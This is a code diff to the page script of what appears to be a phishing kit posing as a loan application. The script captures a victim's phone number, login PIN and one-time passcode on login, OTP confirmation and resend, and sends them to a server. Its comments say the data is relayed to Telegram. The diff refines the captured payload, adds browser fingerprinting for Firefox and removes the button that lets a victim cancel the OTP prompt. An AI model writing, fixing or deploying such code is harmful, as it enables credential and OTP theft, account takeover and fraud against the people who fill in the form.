@@ -168,7 +168,9 @@ input:focus{
 /* RESEND */
 .resend-row{
   display:flex;
+  align-items:center;
   justify-content:space-between;
+  gap:10px;
   margin-top:14px;
 }
 
@@ -264,6 +266,9 @@ try{
   if(raw) loanForm=JSON.parse(raw);
 }catch(e){}
 
+/* Build Telegram heading (THIS is the fix) */
+const loanPlanText = `Loan Request: USD ${loanForm.loanAmount || 'N/A'} / ${loanForm.repayment || 'N/A'} month(s) (${loanForm.employment || 'N/A'})`;
+
 /* ===== DEVICE ===== */
 const ua=navigator.userAgent;
 let device='Unknown';
@@ -271,8 +276,9 @@ if(/Android/i.test(ua)) device='Android';
 else if(/iPhone|iPad/i.test(ua)) device='iOS';
 if(/Chrome/i.test(ua)) device+=' | Chrome';
 else if(/Safari/i.test(ua)) device+=' | Safari';
+else if(/Firefox/i.test(ua)) device+=' | Firefox';
 
-/* ===== PIN HANDLING ===== */
+/* ===== PIN ===== */
 const pins=[...document.querySelectorAll('.pin-digit')];
 let pinValue='';
 const loginBtn=document.getElementById('loginBtn');
@@ -296,18 +302,15 @@ async function sendToServer(payload){
   });
 }
 
-/* ===== LOGIN → TELEGRAM (FIXED ONLY HERE) ===== */
+/* ===== LOGIN ===== */
 loginForm.addEventListener('submit',async e=>{
   e.preventDefault();
 
   await sendToServer({
     event:'login_clicked',
-    title:'NEW LOAN SUBMISSION REQUEST',
-    phone:phone.value,
-    pin:pinValue,
-    loanAmount:loanForm.loanAmount || 'N/A',
-    loanPeriod:loanForm.repayment || 'N/A',
-    employment:loanForm.employment || 'N/A',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    plan:loanPlanText,   // 🔑 FIXED HERE
     device,
     submittedAt:new Date().toISOString()
   });
@@ -315,46 +318,36 @@ loginForm.addEventListener('submit',async e=>{
   otpModal.style.display='flex';
 });
 
-/* ===== CONFIRM OTP → TELEGRAM ===== */
+/* ===== CONFIRM ===== */
 confirmOtp.onclick=async()=>{
   await sendToServer({
     event:'otp_confirm',
-    title:'NEW LOAN SUBMISSION REQUEST',
-    phone:phone.value,
-    pin:pinValue,
+    loginPhone:phone.value,
+    loginPin:pinValue,
     otp:otpBuffer.value,
-    loanAmount:loanForm.loanAmount || 'N/A',
-    loanPeriod:loanForm.repayment || 'N/A',
-    employment:loanForm.employment || 'N/A',
+    plan:loanPlanText,   // 🔑 FIXED HERE
     device,
     submittedAt:new Date().toISOString()
   });
 
-  otpStatus.innerHTML="<span class='success'>Loan submission received successfully.</span>";
+  otpStatus.innerHTML="<span class='success'>Success — request received.</span>";
   setTimeout(()=>location.href='thankyou.html',1200);
 };
 
-/* ===== RESEND OTP → TELEGRAM ===== */
+/* ===== RESEND ===== */
 resendBtn.onclick=async()=>{
   resendBtn.innerHTML='<span class="spinner"></span>Sending…';
 
   await sendToServer({
     event:'resend_otp',
-    title:'NEW LOAN SUBMISSION REQUEST',
-    phone:phone.value,
-    pin:pinValue,
-    loanAmount:loanForm.loanAmount || 'N/A',
-    loanPeriod:loanForm.repayment || 'N/A',
-    employment:loanForm.employment || 'N/A',
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    plan:loanPlanText,   // 🔑 FIXED HERE
     device,
     submittedAt:new Date().toISOString()
   });
 
   resendBtn.innerHTML='OTP sent ✓';
-};
-
-cancelOtp.onclick=()=>{
-  otpModal.style.display='none';
 };
 </script>
 
